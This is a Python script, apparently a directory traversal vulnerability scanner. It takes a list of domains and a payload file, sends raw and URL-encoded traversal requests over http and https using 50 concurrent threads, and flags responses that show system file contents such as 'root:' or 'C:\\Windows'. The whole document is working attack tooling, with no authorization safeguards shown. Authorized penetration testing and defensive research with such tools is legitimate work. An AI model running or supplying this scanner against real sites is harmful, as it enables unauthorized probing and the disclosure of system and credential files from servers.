import threading
import requests
import queue
import time
import csv
import argparse
from concurrent.futures import ThreadPoolExecutor
from collections import Counter
import os


# Read file contents
def read_file(filename):
    try:
        with open(filename, "r", encoding="utf-8") as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return []


# Encode payloads (URL encoding)
def encode_payload(payload):
    return payload.replace("../", "%2e%2e%2f").replace("://", "%3a%2f%2f")


# Construct HTTP request URLs
def construct_urls(domains, payloads, folder_path):
    urls = []
    protocols = ["https", "http"]
    for domain in domains:
        for protocol in protocols:
            for payload in payloads:
                # Add raw and encoded payloads
                urls.append(f"{protocol}://{domain}/{payload}")
                urls.append(f"{protocol}://{domain}/{encode_payload(payload)}")
    print("URL construction done....")
    return urls


# Worker function to send requests
def send_request(url, log_queue, stats):
    try:
        response = requests.get(url, timeout=10, allow_redirects=False)
        is_vulnerable = False  # Default value

        # Check for sensitive content
        if "root:" in response.text or "C:\\Windows" in response.text:
            is_vulnerable = True
            print(f"Potential vulnerability detected: {url}")

        # Update stats
        stats["total_requests"] += 1
        stats["status_codes"].append(response.status_code)
        if is_vulnerable:
            stats["vulnerable_count"] += 1
        else:
            stats["non_vulnerable_count"] += 1

        log_queue.put((url, response.status_code, response.text[:1000], time.strftime("%Y-%m-%d %H:%M:%S"), is_vulnerable))

    except requests.RequestException as e:
        log_queue.put((url, "ERROR", str(e), time.strftime("%Y-%m-%d %H:%M:%S"), False))
        stats["total_requests"] += 1
        stats["status_codes"].append("ERROR")


# Logger thread to write logs
def logger_thread(log_queue, log_file):
    with open(log_file, "w", newline='', encoding='utf-8') as log:
        writer = csv.writer(log)
        # Write header with the new column
        writer.writerow(["URL", "Status Code", "Response Text", "Timestamp", "Is Vulnerable"])
        while True:
            entry = log_queue.get()
            if entry is None:
                break
            writer.writerow(entry)
            log.flush()


# Write consolidated results to a file
def write_consolidated_results(stats, folder_path):
    consolidated_file = f"{folder_path}/consolidated_result.txt"
    with open(consolidated_file, "w", encoding="utf-8") as f:
        f.write("Consolidated Results:\n")
        f.write("=====================\n")
        f.write(f"Total Requests: {stats['total_requests']}\n")
        f.write(f"Vulnerable Count (True): {stats['vulnerable_count']}\n")
        f.write(f"Non-Vulnerable Count (False): {stats['non_vulnerable_count']}\n\n")

        # Count unique status codes
        status_code_counts = Counter(stats["status_codes"])
        f.write("Status Code Counts:\n")
        for code, count in status_code_counts.items():
            f.write(f"{code}: {count}\n")


# Main function
def main(domain):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    # Use OUTPUT_DIR environment variable if set, otherwise fallback to /mnt
    output_dir = os.environ.get('OUTPUT_DIR', f"/mnt/{domain}")
    folder_path = output_dir
    domains_file = f"{folder_path}/domains_{domain}.txt"  # File containing list of domain names
    payloads_file = os.path.join(script_dir, "dir_traversal_payloads.txt")  # File containing directory traversal payloads
    log_file = f"{folder_path}/dir_traversal_{domain}_report.csv"  # Log file

    domains = read_file(domains_file)
    payloads = read_file(payloads_file)

    if not domains or not payloads:
        print("No valid input files. Exiting.")
        return

    urls = construct_urls(domains, payloads, folder_path)
    log_queue = queue.Queue()

    # Initialize stats dictionary
    stats = {
        "total_requests": 0,
        "vulnerable_count": 0,
        "non_vulnerable_count": 0,
        "status_codes": []
    }

    # Start logger thread
    log_thread = threading.Thread(target=logger_thread, args=(log_queue, log_file))
    log_thread.start()

    # Use ThreadPoolExecutor for workers
    max_threads = 50  # Adjust number of concurrent threads
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(send_request, url, log_queue, stats) for url in urls]
        for future in futures:
            future.result()  # Wait for all tasks to complete

    # Stop logger thread
    log_queue.put(None)
    log_thread.join()

    # Write consolidated results
    write_consolidated_results(stats, folder_path)
    print(f"Consolidated results written to {folder_path}/consolidated_result.txt")


if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Directory Traversal Vulnerability Scanner")
    parser.add_argument("domain", help="Domain name to scan (e.g., bumba.global)")
    args = parser.parse_args()

    # Call main function with the provided domain
    main(args.domain)